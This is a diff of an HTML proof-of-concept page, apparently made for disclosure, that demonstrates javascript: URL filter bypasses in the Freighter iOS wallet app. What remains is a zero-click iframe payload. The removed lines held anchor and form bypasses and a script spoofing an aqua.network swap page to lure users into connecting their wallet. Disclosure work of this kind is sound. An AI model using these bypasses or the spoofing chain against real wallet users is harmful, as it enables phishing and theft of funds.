@@ -1,22 +1,7 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h3>CRITICAL: All javascript: filters bypassed in Freighter iOS</h3>
-
-<!-- Auto XSS tanpa klik - paling bahaya -->
+<h3>PoC 0-Click javascript: Bypass - Freighter iOS</h3>
 <iframe src="javascript:alert('iframe auto BYPASS - no click needed')"></iframe>
-
-<script>
-// Chain: setelah bypass, langsung spoof jadi aqua.network
-setTimeout(()=>{
-  history.pushState({},'','/aqua.network/swap');
-  document.body.innerHTML = '<h1>FAKE AQUA.NETWORK</h1><p>Swap XLM - Connect Freighter</p><p>URL: '+location.href+'</p>';
-},1000);
-</script>
-
-<!-- Fallback manual -->
-<a href="javascript:alert('a href BYPASS')">a href bypass</a>
-<form action="javascript:alert('form BYPASS')"><button>form bypass</button></form>
-
 </body>
 </html>
